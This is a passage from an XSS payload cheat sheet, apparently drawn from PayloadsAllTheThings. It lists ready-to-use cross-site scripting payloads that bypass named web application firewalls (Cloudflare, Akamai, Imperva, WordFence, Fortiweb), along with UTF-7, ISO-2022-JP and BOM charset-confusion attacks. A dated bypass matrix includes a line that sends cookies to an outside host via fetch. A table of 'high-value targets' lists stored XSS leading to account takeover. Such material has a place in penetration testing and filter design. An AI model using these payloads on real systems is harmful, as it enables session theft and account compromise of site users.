<iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

<!-- Tab + entity whitespace in javascript: href -->
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

**Akamai:**
```html
<!-- details tag with newline-encoded attributes bypasses Akamai rule -->
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>

<!-- base tag with attribute name containing encoded space -->
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

**Incapsula / Imperva:**
```html
<!-- Carriage return inside event handler attribute -->
<svg onload\r\n=$.globalEval("al"+"ert();")>

<!-- object tag with extra semicolons in base64 MIME type -->
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

**WordFence:**
```html
<!-- HTML entity inside javascript: href for one character -->
<a href=javas&#99;ript:alert(1)>click</a>
<!-- &#99; = 'c' — breaks "javascript" pattern match -->
```

**Fortiweb:**
```javascript
// Unicode-escaped angle brackets + HTML tag (bypass regex on < >)
><h1 onclick=alert('1')>
// Decoded: ></h1 onclick=alert('1')>
```

**Generic multi-WAF bypass via entity/whitespace insertion:**
```html
<!-- Tab characters between attribute name and = (RFC-compliant whitespace) -->
<img src=x onerror	=alert(1)>          <!-- tab between name and = -->
<svg/onload	=alert(1)>                  <!-- tab before = -->

<!-- Newline in attribute position -->
<svg
onload=alert(1)>

<!-- Multiple spaces / control chars as tag whitespace -->
<svg%0Conload=alert(1)>    <!-- 0x0C form feed -->
<svg%0Donload=alert(1)>    <!-- 0x0D carriage return -->
<svg%09onload=alert(1)>    <!-- 0x09 tab -->
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md

---

## Charset Confusion XSS (UTF-7 / ISO-2022-JP / BOM Override)

**Type:** reflected / stored
**Filter bypassed:** WAF / input sanitizers operating on UTF-8 encoded bytes — when the browser decodes the response in a different charset, the sanitized bytes become dangerous markup
**Bypass logic:** Three related techniques exploiting charset mismatch: (1) **UTF-7**: Server returns response without `charset` declaration; attacker coerces browser to UTF-7 via `+ADw-` encoding of `<`. In UTF-7, `+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-` decodes to `<img src="1" onerror="alert(1)" />`. (2) **ISO-2022-JP**: The escape sequence `%1b(J` switches the browser's active character set mid-string; backslash `\` is remapped to yen sign `¥`, causing JS string escapes like `\'` to become `¥'` — breaking out of quoted JS strings. (3) **BOM override**: Injecting a UTF-16 BOM (`%fe%ff`) forces browsers to decode the entire response as UTF-16; `%00<`, `%00s`, `%00c` etc. become the characters `<`, `s`, `c` and form valid HTML.
**Attack chain:** Response missing charset declaration → browser decodes in attacker-chosen charset → sanitized payload decodes to XSS → executes

**Payloads:**
```html
<!-- UTF-7: inject into meta refresh or link tag that lacks charset -->
<!-- Browser decodes +ADw- as < and +AD4- as > in UTF-7 mode -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(document.cookie)+ACI- /+AD4-

<!-- Trigger UTF-7 by injecting Content-Type via CRLF injection -->
<!-- or exploiting a response that returns Content-Type without charset -->
<!-- In attack: encode entire payload in UTF-7 before sending to server -->

<!-- ISO-2022-JP — inject %1b(J escape before a backslash-escaped context -->
<!-- Server is in an Asian locale / accepts non-UTF8 charsets -->
search=%1b(J&lang=en";alert(1)//
<!-- The %1b(J sequence shifts charset; next \" becomes ¥" which doesn't escape the string -->

<!-- UTF-16 BOM override — prepend %FE%FF to force UTF-16BE decoding -->
%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
<!-- Decoded as UTF-16BE: <svg/onload=alert()> -->

<!-- UTF-32 BOM variant -->
%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g...

<!-- Test for charset confusion: does the response have a charset declaration? -->
<!-- curl -I https://target.com/search?q=test | grep -i content-type          -->
<!-- If Content-Type: text/html (no charset=) → try UTF-7 and BOM attacks     -->
```

**Prerequisites:**
- UTF-7: Response must lack `charset` in Content-Type or `<meta charset>` — rare in 2026 but found in legacy apps and some API responses rendered as HTML
- ISO-2022-JP: Server must accept non-UTF-8 charsets AND reflect them; most common in Japanese-locale applications
- BOM: Requires ability to inject raw bytes into response beginning (file upload preview, SSRF-based response, CRLF injection into response headers)

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Bypass Matrix (Updated 2026-05-29)

### New Entries — Techniques Added 2026-05-29

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| Email validator (RFC0822) | Quoted local-part injection | `"><svg/onload=confirm(1)>"@x.y` |
| Email validator (RFC5322) | Comment field injection | `xss@example.com(<img src=x onerror=alert(1)>)` |
| Phone number validator | RFC3966 phone-context injection | `+1234;phone-context=<script>alert(0)</script>` |
| `document.cookie` keyword blocked | `window.cookieStore.getAll()` async API | `cookieStore.getAll().then(c=>fetch('//x.com/?d='+btoa(JSON.stringify(c))))` |
| Tag name blocklist (lowercase match) | Unicode long-s/dotless-i typecase | `<ſvg onload=alert(1)>`, `<ıframe src=javascript:alert(1)>` |
| Backtick `` ` `` character blocked | `&DiacriticalGrave;` HTML entity in script | `<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>` |
| Semicolon `;` blocked | Arithmetic / ternary operator chaining | `'x' * alert(document.cookie) * 'y'` |
| Keywords in event handler value blocked | `eval(id)` — payload in SVG id attribute | `<svg id="alert(1)" onload="eval(id)">` |
| Common event handler blocklist | Obscure handlers (pointer, clipboard, animation) | `<div onpointerover=alert(1)>`, `<div onanimationstart=alert(1) style="animation:x">` |
| `require-trusted-types-for 'script'` | Create permissive own TT policy (unrestricted names) | `trustedTypes.createPolicy('x',{createHTML:s=>s})` → `innerHTML` |
| `require-trusted-types-for 'script'` | Non-protected sink (`location.href`) | `location.href='javascript:alert(1)'` — TT does not cover navigation |
| Open shadow root DOM | Inject via `shadowRoot.innerHTML` | `el.shadowRoot.innerHTML='<img src=x onerror=alert(document.cookie)>'` |
| `<style>` allowed, `<script>` blocked | IE CSS `expression()` | `<div style="width:expression(alert(document.cookie))">` |
| `<style>` allowed (legacy Firefox) | `-moz-binding` XBL remote script | `div{-moz-binding:url(data:text/xml;base64,...#xss)}` |
| Dot notation blocked (`document.cookie`) | Bracket notation + string concat | `window['doc'+'ument']['cook'+'ie']` |
| WAF keyword match without charset decode | UTF-7 charset confusion | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` |
| Cloudflare WAF | Unknown attribute before event handler | `<svg/onrandom=x onload=confirm(1)>` |
| Akamai WAF | Newline-encoded `details` attributes | `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>` |
| Incapsula WAF | CRLF in SVG onload | `<svg onload\r\n=$.globalEval("al"+"ert()")>` |
| WordFence WAF | HTML entity for one char in `javascript:` | `<a href=javas&#99;ript:alert(1)>` |

### High-Value Targets (New — 2026-05-29)

| Target | Why High Value | Impact |
|--------|---------------|--------|
| Email input fields (registration, profile) | RFC0822/5322 validators accept XSS chars | Stored XSS → admin panel ATO |
| Phone number fields | RFC3966 phone-context parameter not sanitized | Stored XSS in user record |
| Web Components (`<custom-element>`) | Shadow DOM often unsanitized; `shadowRoot.innerHTML` sink | Persistent XSS affecting all viewers |
| Corporate intranets / OT systems (IE11) | CSS `expression()` executes in IE without script tag | Cookie theft with zero HTML event handler |
| Legacy Firefox (<56) environments | `-moz-binding` XBL in style attribute | CSS-only XSS bypass |
| Apps with `require-trusted-types-for 'script'` | Non-navigation-sink gap in TT coverage | Bypass via `location.href` or unrestricted policy creation |
